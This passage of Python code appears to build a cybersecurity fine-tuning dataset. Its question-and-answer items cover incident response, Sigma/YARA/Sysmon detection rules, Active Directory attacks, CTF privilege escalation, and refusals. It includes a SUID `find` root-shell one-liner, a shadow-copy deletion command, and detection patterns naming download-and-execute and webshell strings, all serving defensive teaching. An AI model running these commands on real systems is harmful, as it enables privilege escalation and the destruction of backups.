         "disable Wi-Fi / kill the switch port).\n\n"
         "- Isolation stops SMB/RPC propagation to shares immediately.\n"
         "- A hard power-off **destroys RAM**, losing in-memory encryption keys, C2 addresses, "
         "and process context you need for recovery and scoping.\n"
         "- Abrupt power loss mid-write can also corrupt partially encrypted files beyond "
         "repair.\n\n"
         "After isolation: capture memory if feasible, identify the strain, and restore from "
         "known-good offline backups."),
        ("bec-token-revoke",
         "A finance user entered M365 credentials on a phishing page and the attacker logged in "
         "and approved an MFA push from a foreign IP. Give the IR workflow.",
         "1. **Revoke sessions & tokens** first: `Revoke-AzureADUserAllRefreshToken`, then reset "
         "the password — resetting the password alone does *not* kill an existing token.\n"
         "2. **MFA remediation:** remove any attacker-registered MFA methods.\n"
         "3. **Persistence hunt:** check for new **inbox forwarding rules**, mailbox delegate "
         "changes, and consented OAuth apps.\n"
         "4. **Scope:** use message trace to find everyone who got the phish and purge it "
         "tenant-wide."),
        ("order-of-volatility",
         "During a live host investigation, in what order should you collect evidence and why?",
         "Follow the **order of volatility** (RFC 3227): collect the most ephemeral data first.\n"
         "1. CPU registers/cache and **RAM** (live process memory, keys, network state).\n"
         "2. Network connections and ARP/route tables.\n"
         "3. Running processes and open files.\n"
         "4. Disk (filesystem, logs).\n"
         "5. Remote logging / archival media.\n\n"
         "Rationale: memory and network state vanish on reboot, while disk persists — so "
         "imaging RAM before touching disk preserves the most perishable evidence."),
        ("webshell-eradicate",
         "A PHP web shell was found in /var/www/html/uploads/. Give containment and eradication.",
         "**Contain:** pull the host from the load balancer; make `uploads/` non-executable "
         "(`php_admin_flag engine off`) and read-only; preserve access/error logs.\n\n"
         "**Root cause:** find the upload flaw (missing extension/MIME validation) from the "
         "logs.\n\n"
         "**Eradicate:** redeploy application code from a clean, version-controlled image "
         "(don't just delete the shell — assume more persistence); move uploads to a "
         "non-executable object store; rotate any secrets the web user could read."),
        ("svc-account-da",
         "An AD service account in Domain Admins shows interactive logons from an unknown jump "
         "box. Detail containment.",
         "**Contain:** disable/reset the service account and **purge its Kerberos tickets** so "
         "existing TGTs stop working; isolate the jump box (preserve memory/logs first).\n\n"
         "**Harden (root cause):** service accounts should **never** be in Domain Admins; deny "
         "interactive and RDP logon via GPO; migrate to **gMSA** for auto-rotated passwords. "
         "Then review what the account touched while the anomalous logons occurred."),
        ("dfir-evidence-preservation",
         "You must preserve a compromised Linux server for potential legal action. What are the "
         "key evidence-preservation steps?",
         "Work on **copies**, not the original: capture volatile data first (memory image, "
         "process/network state), then take a **bit-for-bit disk image** of the unmounted "
         "volume. **Hash** every image (SHA-256) at acquisition and record it. Maintain a "
         "**chain of custody** (who/what/when/where). Avoid rebooting or installing tools onto "
         "the original, which alters evidence."),
        ("contain-vs-eradicate",
         "A junior analyst asks why we 'contain' before we 'eradicate'. Explain the phases.",
         "The NIST IR phases are Preparation, Detection & Analysis, **Containment**, "
         "**Eradication**, **Recovery**, and Post-Incident. Containment (isolate, block, "
         "disable) stops ongoing damage and preserves evidence. Eradication removes the root "
         "cause (malware, backdoors, the exploited flaw). Eradicating before containing lets an "
         "adversary who still has active access simply re-establish footholds while you clean "
         "up."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ir-{key}", SYS_IR, prompt, ans,
            task_type="incident_response", domain="blue_team", difficulty="advanced",
            requires_evidence=True, tags=["incident_response", "containment", key],
        )


# ==========================================================================================
# 6. Detection engineering — distinct rules/configs.
# ==========================================================================================

def _detection_family(dd: _Deduper) -> None:
    dd.add(
        "train-det-sigma-ps-download",
        SYS_DET,
        "Write a Sigma rule to detect PowerShell downloading and executing remote script "
        "content (WebClient/Invoke-WebRequest chained with IEX).",
        "```yaml\n"
        "title: PowerShell Download and Execute\n"
        "status: stable\n"
        "logsource:\n  category: process_creation\n  product: windows\n"
        "detection:\n"
        "  img:\n    Image|endswith: ['\\powershell.exe', '\\pwsh.exe']\n"
        "  download:\n    CommandLine|contains: ['Net.WebClient','DownloadString','Invoke-WebRequest','iwr ']\n"
        "  exec:\n    CommandLine|contains: ['iex','Invoke-Expression']\n"
        "  condition: img and download and exec\n"
        "falsepositives: ['signed deployment automation']\n"
        "level: high\n"
        "tags: [attack.execution, attack.t1059.001]\n"
        "```\n"
        "Maps to **T1059.001**. Reduce FPs by allowlisting known signed script paths.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "sigma", "t1059.001"],
    )
    dd.add(
        "train-det-yara-php-webshell",
        SYS_DET,
        "Write a YARA rule for obfuscated PHP web shells using base64_decode with dynamic "
        "execution.",
        "```yara\n"
        "rule PHP_Obfuscated_Webshell {\n"
        "  meta:\n    description = \"obfuscated PHP webshell: base64_decode + dynamic eval on user input\"\n"
        "  strings:\n"
        "    $php = \"<?php\" nocase\n"
        "    $eval = /(\\beval\\b|\\bassert\\b|preg_replace\\s*\\(.*\\/e)/ nocase\n"
        "    $b64 = \"base64_decode\" nocase\n"
        "    $src = /\\$_(POST|GET|COOKIE|REQUEST)/ \n"
        "  condition:\n    $php at 0 and $eval and $b64 and $src and filesize < 50KB\n"
        "}\n"
        "```\n"
        "Maps to **T1505.003**. The `filesize` bound and combined conditions keep it "
        "specific to small dropper shells.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "yara", "t1505.003"],
    )
    dd.add(
        "train-det-sysmon-lsass",
        SYS_DET,
        "How do you use Sysmon Event ID 10 to detect credential dumping against lsass.exe?",
        "Configure **Sysmon Event ID 10 (ProcessAccess)** to log handles opened to "
        "`lsass.exe`, filtering on read access masks used by dumpers:\n"
        "```xml\n<ProcessAccess onmatch=\"include\">\n"
        "  <TargetImage condition=\"is\">C:\\Windows\\system32\\lsass.exe</TargetImage>\n"
        "  <GrantedAccess condition=\"contains any\">0x1010;0x1410;0x1438;0x143a;0x1f0fff</GrantedAccess>\n"
        "</ProcessAccess>\n```\n"
        "`0x1010`/`0x1410` include **PROCESS_VM_READ (0x10)**, required to read credential "
        "memory (Mimikatz, procdump). Exclude known-good readers (AV/EDR) by SourceImage. "
        "Maps to **T1003.001**.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "sysmon", "t1003.001"],
    )
    dd.add(
        "train-det-4769-kerberoast",
        SYS_DET,
        "Write a detection concept for Kerberoasting from domain-controller telemetry.",
        "Alert on **Event ID 4769 (Kerberos service-ticket request)** where "
        "**Ticket Encryption Type = 0x17 (RC4)** for accounts that should use AES, especially "
        "many distinct SPNs requested by one principal in a short window from an unusual host. "
        "RC4 is requested because it is faster to crack **offline**. Tune out legitimate "
        "RC4-only services, and pair with a baseline of normal per-user 4769 volume. Detects "
        "**T1558.003** without relying on failed-logon events (there are none).",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "kerberoasting", "t1558.003", "event_4769"],
    )
    dd.add(
        "train-det-attack-chain-mapping",
        SYS_DET,
        "Map this chain to ATT&CK IDs: spearphishing macro doc -> mshta runs VBScript -> "
        "dump LSASS with sekurlsa -> move laterally via PsExec (SMB).",
        "- Spearphishing attachment: **T1566.001**\n"
        "- mshta proxy execution: **T1218.005** (with **T1059.005** for the VBScript)\n"
        "- LSASS credential dumping: **T1003.001**\n"
        "- Lateral movement via PsExec over admin shares: **T1021.002**\n\n"
        "Tactics traversed: Initial Access -> Execution -> Credential Access -> Lateral "
        "Movement.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        requires_evidence=False, tags=["detection_engineering", "attack_mapping", "chain"],
    )


# ==========================================================================================
# 7. Active Directory — distinct attack/defense explanations.
# ==========================================================================================

def _ad_family(dd: _Deduper) -> None:
    scen = [
        ("kerberoasting-mechanics",
         "Explain how Kerberoasting works, why attackers request RC4, and how to defend.",
         "Any authenticated domain user can request a **TGS** for any account that has an "
         "**SPN**. The DC encrypts the ticket with a key derived from the **service account's "
         "password**; the attacker extracts it and cracks it **offline** — no failed logons. "
         "Attackers force **RC4 (etype 0x17)** because it cracks far faster than AES.\n\n"
         "**Defend:** migrate service accounts to **gMSA** (long, auto-rotated passwords); "
         "**enforce AES / disable RC4**; alert on **Event ID 4769** with encryption type 0x17. "
         "ATT&CK: **T1558.003 (Credential Access, TA0006)**."),
        ("asrep-vs-kerberoast",
         "What property enables AS-REP Roasting and how does it differ from Kerberoasting?",
         "AS-REP Roasting needs the account to have **'Do not require Kerberos "
         "preauthentication'** set (`DONT_REQ_PREAUTH`). The attacker sends an AS-REQ with no "
         "pre-auth; the DC returns an **AS-REP** whose encrypted part is derived from the "
         "user's password, cracked offline.\n\n"
         "**Difference:** Kerberoasting (**T1558.003**) needs an **SPN** and attacks the "
         "**TGS**; AS-REP Roasting (**T1558.004**) needs **no SPN** and attacks the **AS-REP** "
         "of pre-auth-disabled accounts. Fix: audit for `DoesNotRequirePreAuth` and remove it."),
        ("dcsync",
         "Explain how DCSync abuses replication to steal credentials and how to detect it.",
         "DCSync uses the **Directory Replication Service (DRSUAPI / DRSGetNCChanges)** to ask "
         "a DC for account secrets *as if it were another DC*. It needs replication rights "
         "(**DS-Replication-Get-Changes / -All**) and runs no code on the DC, returning hashes "
         "including `krbtgt` and Administrator.\n\n"
         "**Detect:** **Event ID 4662** referencing the replication extended-right GUIDs from a "
         "**non-DC** source IP. ATT&CK: **T1003.006**."),
        ("golden-vs-silver",
         "Contrast Golden and Silver tickets: what key signs each and what is the scope?",
         "**Golden ticket** = a forged **TGT** encrypted with the **KRBTGT** key -> whole-"
         "domain access; presented to the DC to obtain any service ticket.\n"
         "**Silver ticket** = a forged **TGS** encrypted with a **specific service account's** "
         "key -> access only to that one service, and it is presented **directly to the "
         "service without contacting the DC** (so no 4769 on the DC).\n\n"
         "Golden-ticket remediation: reset **KRBTGT twice** (with replication between) to "
         "invalidate current and prior keys."),
        ("pth-vs-ptt",
         "Contrast Pass-the-Hash with Pass-the-Ticket.",
         "**Pass-the-Hash (T1550.002)** reuses a captured **NTLM hash** to authenticate over "
         "NTLM without the plaintext password. **Pass-the-Ticket (T1550.003)** reuses a stolen "
         "**Kerberos ticket** (TGT or service ticket) directly. PtH targets NTLM auth; PtT "
         "targets Kerberos. Mitigations differ: PtH is blunted by Credential Guard/LAPS and "
         "disabling NTLM where possible; PtT by protecting ticket material and short ticket "
         "lifetimes."),
        ("llmnr-responder",
         "Explain LLMNR/NBT-NS poisoning and the simple hardening that kills it.",
         "When DNS fails, Windows falls back to **LLMNR/NBT-NS** broadcasts. A tool like "
         "Responder answers 'that's me' and captures the victim's **NetNTLMv2** challenge/"
         "response, which is cracked offline or relayed (**T1557.001**). The simple, high-impact "
         "hardening: **disable LLMNR and NBT-NS** via GPO/interface settings so the broadcast "
         "fallback never happens, and enable SMB signing to defeat relay."),
        ("adcs-esc1",
         "At a high level, what makes an AD CS certificate template dangerous (ESC1-style), and "
         "the fix?",
         "Danger arises when a template lets a **low-privileged user enroll**, permits an "
         "**arbitrary Subject Alternative Name (SAN)**, and is valid for **client "
         "authentication** — so a user requests a cert 'as' a domain admin and authenticates as "
         "them (a PKINIT path to domain compromise). Fix: remove enrollee-supplied SAN, require "
         "manager approval, restrict enrollment rights, and audit templates. This is a "
         "configuration flaw, not a Kerberos protocol bug."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ad-{key}", SYS_AD, prompt, ans,
            task_type="active_directory", domain="blue_team", difficulty="advanced",
            tags=["active_directory", "kerberos", key],
        )


# ==========================================================================================
# 8. CTF / methodology, fundamentals, network, safety — distinct authored items.
# ==========================================================================================

def _ctf_family(dd: _Deduper) -> None:
    scen = [
        ("suid-find",
         "On an authorized CTF host you find /usr/bin/find has the SUID bit. Why does that "
         "allow privilege escalation and how do you remediate it?",
         "The **SUID bit** runs the binary with the file owner's privileges (root). `find` has "
         "a built-in `-exec`, so `find . -exec /bin/sh -p \\; -quit` spawns a shell as **root**. "
         "Remediate by removing the bit (`chmod u-s /usr/bin/find`) and auditing all SUID "
         "binaries (`find / -perm -4000 -type f 2>/dev/null`), keeping only those that need it."),
        ("ssrf-metadata",
         "Explain SSRF against cloud metadata (169.254.169.254) and the primary defenses.",
         "If an app fetches a **user-supplied URL** server-side without restricting internal "
         "ranges, an attacker points it at the **link-local `169.254.169.254`** to read "
         "instance credentials/IAM role tokens. Defenses: block egress to `169.254.169.254/32`, "
         "enforce **IMDSv2** (token-required, blocks naive GET SSRF), and validate/resolve URLs "
         "against an allowlist that rejects private ranges."),
        ("unquoted-service-path",
         "How do unquoted Windows service paths cause privilege escalation and how do you fix "
         "them?",
         "If a service's `ImagePath` has spaces and no quotes (e.g. `C:\\Program Files\\App\\"
         "svc.exe`), Windows tries `C:\\Program.exe`, then `C:\\Program Files\\App.exe`, etc. "
         "A user who can write to `C:\\` or `C:\\Program Files\\` drops `Program.exe` and the "
         "SCM runs it as **SYSTEM**. Audit with WMI for unquoted `PathName` containing spaces; "
         "fix by quoting the path in the service registry key."),
        ("nmap-scan-types",
         "Compare Nmap -sS, -sT, and -sU at the packet level and say why -sS is common in "
         "authorized assessments.",
         "**-sS (SYN, half-open):** SYN -> SYN/ACK (open) or RST (closed); scanner sends RST "
         "before the handshake completes. Fast, needs raw-socket privileges, often avoids "
         "app-level connection logs.\n"
         "**-sT (connect):** full OS `connect()` three-way handshake; used without raw-socket "
         "privileges but more likely logged by the application.\n"
         "**-sU (UDP):** send UDP; **ICMP port-unreachable** => closed, no reply => open|"
         "filtered; slow due to ICMP rate-limiting.\n\n"
         "`-sS` is preferred for speed and lighter application-log footprint (not true "
         "'stealth' against modern network sensors)."),
        ("path-hijack-cron",
         "On an authorized CTF box, a root cron job runs `backup` without an absolute path and "
         "PATH includes a world-writable dir. Why is this exploitable and how do you fix it?",
         "cron runs the job as root, and the shell resolves `backup` against **PATH**. If a "
         "world-writable directory appears **before** the real binary's directory, an attacker "
         "drops a malicious `backup` there and it executes as root. Fix: use **absolute paths** "
         "in scripts/cron, set a minimal safe PATH in the job, and remove write access to "
         "directories on root's PATH."),
        ("password-cracking-methodology",
         "You captured NetNTLMv2 hashes in a lab. Outline a responsible cracking methodology.",
         "1. Identify the hash format (e.g. hashcat mode 5600 for NetNTLMv2).\n"
         "2. Start with a curated **wordlist** (rockyou-style) plus targeted rules, then "
         "**masks** for known policy patterns.\n"
         "3. Prioritize weak/service accounts; track cracked vs. total for reporting.\n"
         "Only ever do this against hashes you are **authorized** to test; the goal is to "
         "demonstrate password-policy weakness, and the remediation is longer passphrases, "
         "AES/Kerberos hardening, and MFA."),
        ("privesc-enumeration",
         "First 5 minutes on a low-priv Linux shell in an authorized lab: what do you enumerate "
         "for privilege escalation and why?",
         "Enumerate: **SUID/SGID** binaries (`find / -perm -4000`), **sudo rights** "
         "(`sudo -l`), **writable cron/systemd** units and PATH, **kernel/OS version** vs known "
         "local exploits, and **credentials in files/history/env**. Each maps to a distinct "
         "escalation path (GTFOBins for SUID/sudo, hijacking scheduled jobs, kernel exploits, "
         "reused secrets). Enumerate before exploiting so you pick the lowest-risk path."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ctf-{key}", SYS_EDU, prompt, ans,
            task_type="ctf_methodology", domain="offensive_ctf", difficulty="advanced",
            tags=["ctf", "methodology", key],
        )


def _fundamentals_family(dd: _Deduper) -> None:
    scen = [
        ("hash-vs-encrypt",
         "Contrast cryptographic hashing and symmetric encryption; when do you use each?",
         "**Hashing** is a one-way, keyless (or HMAC-keyed) fixed-length digest — used for "
         "integrity (SHA-256), authentication (HMAC), and password storage with a memory-hard "
         "KDF (Argon2id/bcrypt). **Symmetric encryption** is reversible with a shared key — "
         "used for confidentiality (AES-256-GCM at rest, TLS in transit). Use hashing when you "
         "must *verify* without recovering the input; encryption when you must *recover* it.",
         "cryptography"),
        ("pfs",
         "What is Perfect Forward Secrecy in TLS 1.3 and how does it protect recorded traffic?",
         "PFS means compromising the server's **long-term private key does not decrypt past "
         "sessions**. TLS 1.3 uses **ephemeral (EC)DHE** per connection: a fresh session key is "
         "derived and the ephemeral private keys are discarded. The long-term key only "
         "**authenticates** the handshake. So captured ciphertext stays safe even if the "
         "server key later leaks.",
         "cryptography"),
        ("zero-trust",
         "Summarize Zero Trust per NIST SP 800-207.",
         "Zero Trust treats **every** request as untrusted regardless of network location. "
         "Core tenets: **verify explicitly** (identity, device health, context on every "
         "request), **least privilege** (JIT/JEA, adaptive policy), and **assume breach** "
         "(segment, encrypt end-to-end, log and analyze). There is no implicit trust from "
         "being 'inside' the perimeter.",
         "fundamentals"),
        ("cia-triad",
         "Define the CIA triad and give one control per pillar.",
         "**Confidentiality** — data only to authorized parties; control: encryption + RBAC + "
         "MFA. **Integrity** — data not tampered; control: digital signatures / HMAC. "
         "**Availability** — accessible when needed; control: redundancy + DDoS mitigation + "
         "tested backups.",
         "fundamentals"),
        ("pki-revocation",
         "How does PKI certificate validation work, and contrast CRL, OCSP, and OCSP stapling?",
         "The client builds a chain from the leaf through intermediates to a trusted root, and "
         "checks validity dates, hostname (SAN), and key usage. Revocation: **CRL** is a signed "
         "list of revoked serials (large, latency between publishes); **OCSP** is a real-time "
         "query to the CA (latency + privacy leak); **OCSP stapling** has the server fetch and "
         "attach a signed, time-stamped OCSP response in the handshake — no client latency, no "
         "privacy leak.",
         "cryptography"),
        ("symmetric-vs-asymmetric",
         "Contrast symmetric and asymmetric cryptography and how TLS uses both.",
         "**Symmetric** uses one shared key — fast, ideal for bulk data (AES). **Asymmetric** "
         "uses a public/private key pair — slower, ideal for key exchange and signatures "
         "(ECDHE, RSA/ECDSA). TLS combines them: an asymmetric handshake authenticates the "
         "server and establishes a shared secret, then the session switches to **symmetric** "
         "AES for the actual data. You get asymmetric's key distribution with symmetric's speed.",
         "cryptography"),
        ("salting-passwords",
         "Why salt password hashes, and why use bcrypt/Argon2 instead of SHA-256?",
         "A **salt** is a unique random value per password so identical passwords hash "
         "differently — defeating precomputed **rainbow tables** and revealing reuse. But a fast "
         "hash like SHA-256 lets an attacker try billions of guesses/sec on stolen hashes. "
         "**bcrypt/Argon2** are deliberately **slow and memory-hard** with a tunable work "
         "factor, so offline cracking is orders of magnitude harder even with the salt known.",
         "cryptography"),
        ("defense-in-depth",
         "Explain defense in depth with a concrete layered example.",
         "Defense in depth layers independent controls so one failure isn't fatal. Example for "
         "a web app: WAF + input validation (perimeter), least-privilege app/DB accounts and "
         "parameterized queries (app), network segmentation and egress filtering (network), MFA "
         "and RBAC (identity), and logging/EDR + tested backups (detection & recovery). An "
         "attacker must defeat several distinct controls, and each layer buys detection time.",
         "fundamentals"),
    ]
    for key, prompt, ans, cat in scen:
        dd.add(
            f"train-fund-{key}", SYS_FUND, prompt, ans,
            task_type="cryptography" if cat == "cryptography" else "fundamentals",
            domain="general", difficulty="intermediate", requires_evidence=False,
            tags=["fundamentals", cat, key],
        )


def _network_family(dd: _Deduper) -> None:
    scen = [
        ("tls13-handshake",
         "Summarize the TLS 1.3 handshake and one security improvement over TLS 1.2.",
         "TLS 1.3: ClientHello (with key share) -> ServerHello + key share, the server "
         "authenticates and both derive keys via **(EC)DHE**, then encrypted Finished — one "
         "round trip. Improvement: it **removes static-RSA key exchange and weak ciphers**, so "
         "**forward secrecy is mandatory**, and most of the handshake is encrypted."),
        ("kerberos-flow",
         "Walk through normal Kerberos authentication (AS/TGS/AP exchanges).",
         "1. **AS-REQ/AS-REP:** client proves knowledge of its key (pre-auth) and gets a "
         "**TGT** encrypted with the **krbtgt** key.\n"
         "2. **TGS-REQ/TGS-REP:** client presents the TGT to request a **service ticket (TGS)** "
         "for a specific SPN.\n"
         "3. **AP-REQ:** client presents the service ticket to the service, which validates it "
         "with its own key. The KDC never sees the service password; tickets are key-encrypted, "
         "not password-carrying."),
        ("arp-spoofing",
         "Explain ARP spoofing and a practical mitigation.",
         "ARP has no authentication, so an attacker on the LAN sends forged ARP replies mapping "
         "the gateway's IP to the attacker's MAC, causing hosts to send traffic through the "
         "attacker (AiTM). Mitigate with **Dynamic ARP Inspection** (tied to DHCP snooping) on "
         "managed switches, and static ARP for critical hosts."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-net-{key}", SYS_FUND, prompt, ans,
            task_type="network", domain="general", difficulty="intermediate",
            requires_evidence=False, tags=["network", "protocol", key],
        )


def _safety_family(dd: _Deduper) -> None:
    scen = [
        ("ransomware-refuse",
         "Write working ransomware that encrypts C:\\Users and deletes shadow copies "
         "undetected.",
         "I won't provide functional ransomware or evasion code. For **defense**: ransomware "
         "commonly deletes recovery via `vssadmin delete shadows /all /quiet` — monitor "
         "**Event ID 4688** for that, keep **offline immutable backups**, and test recovery. "
         "For safe research, use benign canary files in an isolated lab with authorization."),
        ("neighbor-wifi-refuse",
         "How do I get into my neighbor's Wi-Fi without their permission?",
         "I can't help access a network you're not authorized to use. If it's your own "
         "network you want to harden: use **WPA3-SAE** (or WPA2 with a long passphrase), "
         "**disable WPS**, and segment guests from management. On a network you own or have "
         "written authorization to test, wireless assessment is legitimate — this isn't."),
        ("edr-bypass-refuse",
         "Give me a Mimikatz build that bypasses all AV to dump creds on a live bank network.",
         "I won't provide evasion tooling for someone else's production network. To **defend** "
         "LSASS: enable **RunAsPPL** (LSA protection), deploy **Credential Guard** (VBS), and "
         "use **LAPS** so local admin passwords are unique. These block the handle-open that "
         "credential dumpers rely on."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-safe-{key}", SYS_SAFE, prompt, ans,
            task_type="fundamentals", domain="general", difficulty="advanced",
            requires_evidence=False, tags=["safety_boundaries", "dual_use_refusal", key],
        )


def _web_family(dd: _Deduper) -> None:
    scen = [
        ("sqli-parameterized",
         "Why do parameterized queries stop SQL injection when input escaping often fails?",
         "Parameterized queries send the SQL text and the data on **separate channels**: the "
         "query is parsed and planned first, then values are bound as literals that can never "
         "change the statement's structure. Escaping tries to sanitize data *inside* the SQL "
         "string, which fails against edge cases (encodings, second-order input, numeric "
         "contexts). Binding removes the mixing of code and data entirely."),
        ("stored-vs-reflected-xss",
         "Contrast stored and reflected XSS and give the primary defense.",
         "**Reflected XSS** echoes attacker input from the request straight back into the "
         "response (needs a crafted link/victim interaction). **Stored XSS** persists the "
         "payload server-side (e.g. a comment) so it executes for every viewer — higher impact. "
         "Primary defense for both: **context-aware output encoding**, plus a strict "
         "**Content-Security-Policy** and input validation as defense in depth."),
        ("csrf-samesite",
         "How does CSRF work and how do anti-CSRF tokens and SameSite cookies stop it?",
         "CSRF abuses the browser automatically attaching a victim's session cookie to a "
         "forged cross-site request. An **anti-CSRF token** is a per-session secret the "
         "attacker's site can't read or predict, required on state-changing requests. "
         "**SameSite=Lax/Strict** cookies tell the browser not to send the session cookie on "
         "cross-site requests, cutting off the automatic-credential premise."),
        ("idor",
         "What is IDOR and why doesn't hiding the ID fix it?",
         "Insecure Direct Object Reference: the app uses a client-supplied identifier (e.g. "
         "`/invoice?id=123`) to fetch an object **without checking the requester is authorized** "
         "for it, so changing the ID exposes others' data. Hiding or obfuscating the ID is "
         "security-by-obscurity; the fix is a server-side **authorization check** that the "
         "current principal owns/may access the object."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-web-{key}", SYS_EDU, prompt, ans,
            task_type="web_security", domain="general", difficulty="intermediate",
            requires_evidence=False, tags=["web_security", key],
        )


def _windows_family(dd: _Deduper) -> None:
    scen = [
        ("logon-types",
         "Explain Windows Logon Types 2, 3, and 10 and why they matter in triage.",
         "**Type 2 (Interactive):** at the console/keyboard. **Type 3 (Network):** accessing a "
         "resource over the network (SMB, IIS, RPC) with no desktop — the most common in "
         "lateral movement. **Type 10 (RemoteInteractive):** RDP. In triage the type tells you "
         "*how* the account was used: a service account showing Type 10 (interactive RDP) is "
         "abnormal and worth investigating."),
        ("4624-4625-4672",
         "What do Event IDs 4624, 4625, and 4672 mean together?",
         "**4624** = successful logon, **4625** = failed logon, **4672** = special privileges "
         "assigned at logon (admin-equivalent rights). A burst of 4625 then a 4624 is a "
         "successful guess; a 4624 immediately followed by **4672** means the account logged on "
         "*with administrative privileges* — useful for spotting privileged logons to hunt."),
        ("amsi-scriptblock",
         "How do AMSI and PowerShell script-block logging help detect malicious PowerShell?",
         "**Script-block logging (Event ID 4104)** records the actual (de-obfuscated at "
         "execution) script content, so `-EncodedCommand` payloads are captured in cleartext. "
         "**AMSI** lets AV/EDR scan script content at runtime, after in-memory de-obfuscation, "
         "before execution. Together they defeat simple base64/`-enc` evasion that would hide "
         "from command-line logging alone."),
        ("lsa-protection",
         "What are RunAsPPL and Credential Guard, and what attack do they blunt?",
         "**RunAsPPL** marks LSASS as a Protected Process Light so non-protected processes can't "
         "open a read handle to it. **Credential Guard** uses virtualization-based security to "
         "isolate NTLM/Kerberos secrets from the normal LSASS address space. Both blunt "
         "**LSASS credential dumping (T1003.001)** — the dumper can't read the secrets even as "
         "admin."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-win-{key}", SYS_AD, prompt, ans,
            task_type="windows_security", domain="blue_team", difficulty="intermediate",
            requires_evidence=False, tags=["windows_security", key],
        )


def build_sft_v2_dataset(registry: FactRegistry | None = None) -> list[TrainingItem]:
    """Assemble the sft_v0.2 dataset. Guarantees distinct assistant answers + unique ids."""
    reg = registry or load_fact_registry()
    dd = _Deduper()
    _attack_family(dd, reg)
    _hallucination_family(dd)
    _insufficient_family(dd)
    _log_family(dd)
    _ir_family(dd)
    _detection_family(dd)
    _ad_family(dd)
    _ctf_family(dd)
    _fundamentals_family(dd)
    _network_family(dd)
    _web_family(dd)
    _windows_family(dd)
    _safety_family(dd)
    return dd.items


def export_dataset_to_jsonl(items: list[TrainingItem], output_path: str | Path) -> None:
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with output_path.open("w", encoding="utf-8") as fh:
        for item in items:
            fh.write(item.model_dump_json() + "\n")
    print(f"Exported {len(items)} training items to {output_path}")


if __name__ == "__main__":
    dataset = build_sft_v2_dataset()
    export_dataset_to_jsonl(dataset, "data/training/sft_v0.2.jsonl")
